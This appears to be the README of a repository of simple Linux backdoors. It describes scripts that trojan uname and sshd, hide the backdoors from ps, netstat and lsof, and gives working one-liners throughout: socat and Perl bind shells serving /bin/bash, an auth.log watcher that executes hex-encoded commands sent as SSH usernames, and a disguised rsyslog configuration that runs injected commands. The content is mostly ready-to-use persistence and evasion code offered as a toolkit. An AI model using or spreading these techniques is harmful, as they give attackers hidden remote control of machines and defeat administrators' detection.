# backdoors
Simple linux backdoors and hiding techniques

## bd_uname.sh
Uncomment the preferred backdoor

Run the script as root to backdoor the **uname** command

Connect to the backdoor depending on the choice

```bash
socat STDIO TCP4:IP:4444
  or
socat STDIO TCP4:IP:3177
  or
socat STDIO SCTP:IP:1177
  or
socat STDIO TCP4:IP:1337
```

## bd_hide.sh
Run the script to protect the backdoor from discovery through **ps**, **netstat** or **lsof**

## bd_sshd.sh
Run the script to backdoor the **sshd** server

Connect to the backdoor by running

```bash
socat STDIO TCP4:<target ip>:22,sourceport=19526
```

## bd_uname_c.sh
Same as **bd_uname.sh** but creates a backdoored binary instead of a shell script

## bd_hide_c.sh
Same as **bd_hide.sh** but creates backdoored binaries instead of shell scripts

# Backdoor Techniques

## SOCAT TCP
LISTEN: 
```bash
socat TCP4-Listen:3177,fork EXEC:/bin/bash &
```

CONNECT: 
```bash
socat STDIO TCP4:IP:3177
```

## SOCAT SCTP
LISTEN: 
```bash
socat SCTP-Listen:1177,fork EXEC:/bin/bash &
```

CONNECT: 
```bash
socat STDIO SCTP:IP:1177
```

## PERL TCP
LISTEN: 
```bash
perl -MIO -e'$s=new IO::Socket::INET(LocalPort=>1337,Listen=>1);while($c=$s->accept()){$_=<$c>;print $c `$_`;}' &
```

CONNECT: 
```bash
socat STDIO TCP4:IP:1337
```

## AUTH.LOG
LISTEN: 
```bash
perl -e'while(1){sleep(1);while(<>){system pack("H*",$1)if/LEGO(\w+)/}}'</var/log/auth.log & 
```

EXECUTE REMOTE COMMAND:
```bash
perl -e 'print "LEGO".unpack("H*","id > /tmp/auth.owned")."\n"'
LEGO6964203e202f746d702f617574682e6f776e6564
ssh LEGO6964203e202f746d702f617574682e6f776e6564@<target_ip>
```

## RSYSLOG
LISTEN:
```bash
man -a rsyslogd syslog|perl -pe'print "auth.* ^/bin/atg "if$.==177;print"#"' > /etc/rsyslog.d/README.conf
echo -e '#!/bin/sh\nsh -c "$1"'>/bin/atg
chmod 755 /bin/atg
/etc/init.d/rsyslog restart
```

EXECUTE: 
```bash
echo "';whoami>/tmp/rsyslogd.owned;'"| socat STDIO TCP4:<target ip>:22
```
